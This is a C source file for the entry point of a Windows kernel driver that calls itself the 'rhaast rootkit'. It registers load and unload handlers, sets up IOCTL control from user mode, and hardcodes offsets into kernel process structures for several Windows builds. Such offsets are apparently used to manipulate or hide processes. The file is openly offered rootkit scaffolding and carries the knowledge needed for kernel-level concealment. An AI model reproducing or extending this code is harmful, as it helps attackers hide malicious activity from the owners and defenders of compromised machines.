#include <Rhaast.h>

extern PSHORT NtBuildNumber;

/**
 * @brief
 *      main entry point of the rhaast rootkit
 *  
 * @return	
 *      if successful executed function
 */
NTSTATUS RhaastEntry(
    VOID
) {
    NTSTATUS NtStatus = STATUS_SUCCESS;

    PUTS( "Rhaast loaded" );

    Instance.DriverObject->DriverUnload = ( PDRIVER_UNLOAD ) RhaastUnLoad;

    /* init driver and other resources/info */
    if ( ! NT_SUCCESS( NtStatus = RhaastInit() ) ) {
        PUTS( "Failed to init Rhaast driver" )
        return NtStatus;
    }

    /* init I/O communication over IOCTLs */
    if ( ! NT_SUCCESS( NtStatus = TsIoCtlInit() ) ) {
        PRINTF( "Failed init IOCTL communication: %p\n", NtStatus )
    }
    
    return NtStatus; 
}

/**
 * @brief
 *      initialize rhaast rootkit features
 *
 * @return
 *      if successful executed function
 */
NTSTATUS RhaastInit(
    VOID
) {
    NTSTATUS NtStatus = STATUS_SUCCESS;

    Instance.WindowsBuild = *NtBuildNumber;

    /* set ProcessLock offset */
    switch ( *NtBuildNumber  )
    {
        case WINBUILD_1507:
        case WINBUILD_1511:
        case WINBUILD_1607:
        case WINBUILD_1703:
        case WINBUILD_1709:
        case WINBUILD_1803:
        case WINBUILD_1809: {
            Instance.Ofs.ProcessLock = 0x2d8;
            break;
        }

        case WINBUILD_1903:
        case WINBUILD_1909: {
            Instance.Ofs.ProcessLock = 0x2e0;
            break;
        }

        default: {
            Instance.Ofs.ProcessLock = 0x438;
            break;
        }
    }

    /* set ProcessActiveList offset */
    switch ( Instance.WindowsBuild )
    {
        case WINBUILD_1507:
        case WINBUILD_1511:
        case WINBUILD_1607:
        case WINBUILD_1903:
        case WINBUILD_1909: {
            Instance.Ofs.ProcessActiveList = 0x2f0;
            break;
        }

        case WINBUILD_1703:
        case WINBUILD_1709:
        case WINBUILD_1803:
        case WINBUILD_1809: {
            Instance.Ofs.ProcessActiveList = 0x2e8;
            break;
        }

        default: {
            Instance.Ofs.ProcessActiveList = 0x448;
            break;
        }
    }

    /* set other offsets
     * NOTE:
     *      I am using Windows 11 22h2 as my test machine so
     *      i haven't set other offsets for other versions.
     *      todo do it next. 
     */
    switch ( Instance.WindowsBuild )
    {
        case WINBUILD_1122H2: {
            Instance.Ofs.ProcessVadRoot = 0x7d8;
            break;
        }

        default: {
            NtStatus = STATUS_NOT_SUPPORTED;
        }
    }

    return NtStatus;
}

/**
 * @brief
 *      Entry of unloading the rhaast driver from kernel 
 *      Free resources & memory
 * 
 * @param DriverObject
 *      DriverObject of the current rhaast rootkit
 */
VOID RhaastUnLoad(
    IN PDRIVER_OBJECT DriverObject
) {
    PUTS( "Starting to unload driver & resources" );

    /* TODO: free up memory & resources */

    PUTS( "Finished cleanup. Cya" ) 
}